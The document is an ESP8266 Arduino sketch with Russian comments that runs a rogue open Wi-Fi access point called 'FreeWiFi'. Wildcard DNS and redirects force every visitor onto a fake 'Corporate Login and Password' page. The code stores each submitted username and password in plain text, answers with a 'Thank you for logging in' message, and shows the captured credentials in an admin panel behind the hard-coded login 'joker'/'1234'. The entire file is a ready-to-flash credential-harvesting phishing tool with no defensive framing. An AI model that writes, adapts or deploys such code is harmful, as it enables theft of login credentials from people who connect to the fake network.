#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer server(80);

const char* ssid = "FreeWiFi";
const char* password = "";

const String adminLogin = "joker";
const String adminPassword = "1234";

struct LoginAttempt {
  String username;
  String password;
};
LoginAttempt loginAttempts[20];
int attemptCount = 0;

bool isAdminAuthorized = false;

void handleLogin() {
  String page = "<html><head><title>Login</title>";
  page += "<style>body { font-family: Arial; text-align: center; padding: 50px; }";
  page += "input { padding: 10px; margin: 10px; width: 80%; font-size: 1em; }</style></head>";
  page += "<body><h2>Enter Corporate Login and Password</h2>";
  page += "<form action=\"/auth\" method=\"POST\">";
  page += "Login: <input type=\"text\" name=\"username\"><br>";
  page += "Password: <input type=\"password\" name=\"password\"><br>";
  page += "<input type=\"submit\" value=\"Login\" style=\"width: 50%; padding: 10px; font-size: 1em;\"></form>";
  page += "</body></html>";
  server.send(200, "text/html", page);
}

void handleAuth() {
  String username = server.arg("username");
  String password = server.arg("password");

  if (username == adminLogin && password == adminPassword) {
    isAdminAuthorized = true;
    server.sendHeader("Location", "/admin-panel");
    server.send(303);
  } else {
    if (attemptCount < 20) {
      loginAttempts[attemptCount].username = username;
      loginAttempts[attemptCount].password = password;
      attemptCount++;
    }
    server.send(200, "text/html", "<html><body><h2>Thank you for logging in</h2></body></html>");
  }
}

void handleAdminLogin() {
  String page = "<html><head><title>Admin Login</title>";
  page += "<style>body { font-family: Arial; text-align: center; padding: 50px; }";
  page += "input { padding: 10px; margin: 10px; width: 80%; font-size: 1em; }</style></head>";
  page += "<body><h2>Admin Panel Login</h2>";
  page += "<form action=\"/admin-auth\" method=\"POST\">";
  page += "Admin Login: <input type=\"text\" name=\"admin_username\"><br>";
  page += "Admin Password: <input type=\"password\" name=\"admin_password\"><br>";
  page += "<input type=\"submit\" value=\"Login\" style=\"width: 50%; padding: 10px; font-size: 1em;\"></form>";
  page += "</body></html>";
  server.send(200, "text/html", page);
}

void handleAdminAuth() {
  String adminUsername = server.arg("admin_username");
  String adminPass = server.arg("admin_password");

  if (adminUsername == adminLogin && adminPass == adminPassword) {
    isAdminAuthorized = true;
    server.sendHeader("Location", "/admin-panel");
    server.send(303);
  } else {
    isAdminAuthorized = false;
    server.send(403, "text/html", "<html><body><h2>Access Denied</h2></body></html>");
  }
}

void handleAdminPanel() {
  if (!isAdminAuthorized) {
    server.send(403, "text/html", "<html><body><h2>Access Denied</h2></body></html>");
    return;
  }

  String page = "<html><head><title>Admin Panel</title>";
  page += "<style>body { font-family: Arial; } table { width: 100%; border-collapse: collapse; }";
  page += "th, td { padding: 10px; border: 1px solid #ddd; text-align: center; }</style></head>";
  page += "<body><h2>Admin Panel - Login Attempts</h2><table>";
  page += "<tr><th>Username</th><th>Password</th></tr>";

  for (int i = 0; i < attemptCount; i++) {
    page += "<tr><td>" + loginAttempts[i].username + "</td><td>" + loginAttempts[i].password + "</td></tr>";
  }

  page += "</table></body></html>";
  server.send(200, "text/html", page);
}

// Перехватываем все неизвестные пути и перенаправляем на страницу логина
void handleNotFound() {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(303);
}

void setup() {
  Serial.begin(115200);

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password);
  Serial.println("Access Point started");

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", handleLogin);
  server.on("/auth", HTTP_POST, handleAuth);
  server.on("/admin", handleAdminLogin);
  server.on("/admin-auth", HTTP_POST, handleAdminAuth);
  server.on("/admin-panel", handleAdminPanel);

  // Обработчик для перенаправления всех неизвестных путей
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("Web server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
